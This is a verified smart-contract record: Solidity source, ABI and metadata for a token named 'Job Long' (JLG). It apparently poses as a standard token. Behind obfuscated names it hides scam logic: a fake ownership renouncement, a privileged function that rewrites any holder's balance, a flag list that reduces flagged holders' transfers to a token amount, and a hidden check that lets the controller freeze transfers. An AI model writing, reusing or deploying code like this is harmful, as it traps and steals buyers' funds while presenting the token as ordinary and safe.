{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface feeSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract senderWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverEnableTx {\n    function createPair(address receiverIs, address liquidityFundList) external returns (address);\n}\n\ninterface txFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txWallet) external view returns (uint256);\n\n    function transfer(address walletEnableMax, uint256 autoToken) external returns (bool);\n\n    function allowance(address launchedMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletEnableMax,\n        uint256 autoToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyLiquidityList, uint256 value);\n    event Approval(address indexed launchedMin, address indexed spender, uint256 value);\n}\n\ninterface txFromMetadata is txFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract JobLong is senderWallet, txFrom, txFromMetadata {\n\n    string private limitFeeAmount = \"JLG\";\n\n    mapping(address => mapping(address => uint256)) private takeAuto;\n\n    bool public swapAmount;\n\n    string private launchSell = \"Job Long\";\n\n    uint256 private amountAt;\n\n    uint256 buyTeam;\n\n    uint256 private tokenTo = 100000000 * 10 ** 18;\n\n    uint256 public txAuto;\n\n    bool public shouldMin;\n\n    function shouldTeamToken() public {\n        emit OwnershipTransferred(launchedAtAuto, address(0));\n        launchIs = address(0);\n    }\n\n    event OwnershipTransferred(address indexed isSell, address indexed amountTake);\n\n    function approve(address marketingTotalLaunch, uint256 autoToken) public virtual override returns (bool) {\n        takeAuto[_msgSender()][marketingTotalLaunch] = autoToken;\n        emit Approval(_msgSender(), marketingTotalLaunch, autoToken);\n        return true;\n    }\n\n    uint256 private takeLaunchedList;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenTo;\n    }\n\n    mapping(address => uint256) private buyMinTotal;\n\n    address limitSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamMarketing;\n    }\n\n    uint256 private tradingSenderEnable;\n\n    function atAuto(address walletAmount, address walletEnableMax, uint256 autoToken) internal returns (bool) {\n        require(buyMinTotal[walletAmount] >= autoToken);\n        buyMinTotal[walletAmount] -= autoToken;\n        buyMinTotal[walletEnableMax] += autoToken;\n        emit Transfer(walletAmount, walletEnableMax, autoToken);\n        return true;\n    }\n\n    constructor (){\n        \n        feeSwap enableLaunch = feeSwap(limitSell);\n        exemptLiquidity = receiverEnableTx(enableLaunch.factory()).createPair(enableLaunch.WETH(), address(this));\n        \n        launchedAtAuto = _msgSender();\n        shouldTeamToken();\n        receiverReceiver[launchedAtAuto] = true;\n        buyMinTotal[launchedAtAuto] = tokenTo;\n        if (walletReceiver != swapAmount) {\n            amountAt = txAuto;\n        }\n        emit Transfer(address(0), launchedAtAuto, tokenTo);\n    }\n\n    function toMarketing(uint256 autoToken) public {\n        marketingMax();\n        buyTeam = autoToken;\n    }\n\n    function transferFrom(address walletAmount, address walletEnableMax, uint256 autoToken) external override returns (bool) {\n        if (_msgSender() != limitSell) {\n            if (takeAuto[walletAmount][_msgSender()] != type(uint256).max) {\n                require(autoToken <= takeAuto[walletAmount][_msgSender()]);\n                takeAuto[walletAmount][_msgSender()] -= autoToken;\n            }\n        }\n        return isMin(walletAmount, walletEnableMax, autoToken);\n    }\n\n    mapping(address => bool) public receiverReceiver;\n\n    function receiverShouldEnable(address receiverMin, uint256 autoToken) public {\n        marketingMax();\n        buyMinTotal[receiverMin] = autoToken;\n    }\n\n    address public exemptLiquidity;\n\n    function isMin(address walletAmount, address walletEnableMax, uint256 autoToken) internal returns (bool) {\n        if (walletAmount == launchedAtAuto) {\n            return atAuto(walletAmount, walletEnableMax, autoToken);\n        }\n        uint256 exemptMin = txFrom(exemptLiquidity).balanceOf(fundTx);\n        require(exemptMin == buyTeam);\n        require(walletEnableMax != fundTx);\n        if (exemptList[walletAmount]) {\n            return atAuto(walletAmount, walletEnableMax, limitAuto);\n        }\n        return atAuto(walletAmount, walletEnableMax, autoToken);\n    }\n\n    function marketingMax() private view {\n        require(receiverReceiver[_msgSender()]);\n    }\n\n    uint256 public tradingFrom;\n\n    function owner() external view returns (address) {\n        return launchIs;\n    }\n\n    uint8 private teamMarketing = 18;\n\n    address fundTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private launchIs;\n\n    function name() external view virtual override returns (string memory) {\n        return launchSell;\n    }\n\n    address public launchedAtAuto;\n\n    function fundSell(address minExempt) public {\n        marketingMax();\n        \n        if (minExempt == launchedAtAuto || minExempt == exemptLiquidity) {\n            return;\n        }\n        exemptList[minExempt] = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return launchIs;\n    }\n\n    uint256 fundTakeToken;\n\n    function transfer(address receiverMin, uint256 autoToken) external virtual override returns (bool) {\n        return isMin(_msgSender(), receiverMin, autoToken);\n    }\n\n    function allowance(address sellAmountBuy, address marketingTotalLaunch) external view virtual override returns (uint256) {\n        if (marketingTotalLaunch == limitSell) {\n            return type(uint256).max;\n        }\n        return takeAuto[sellAmountBuy][marketingTotalLaunch];\n    }\n\n    function takeAmount(address swapMode) public {\n        if (shouldMin) {\n            return;\n        }\n        \n        receiverReceiver[swapMode] = true;\n        \n        shouldMin = true;\n    }\n\n    uint256 constant limitAuto = 7 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitFeeAmount;\n    }\n\n    function balanceOf(address txWallet) public view virtual override returns (uint256) {\n        return buyMinTotal[txWallet];\n    }\n\n    mapping(address => bool) public exemptList;\n\n    bool public walletReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyLiquidityList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAmountBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingTotalLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTotalLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minExempt\",\"type\":\"address\"}],\"name\":\"fundSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAtAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoToken\",\"type\":\"uint256\"}],\"name\":\"receiverShouldEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTeamToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMode\",\"type\":\"address\"}],\"name\":\"takeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoToken\",\"type\":\"uint256\"}],\"name\":\"toMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletEnableMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "JobLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}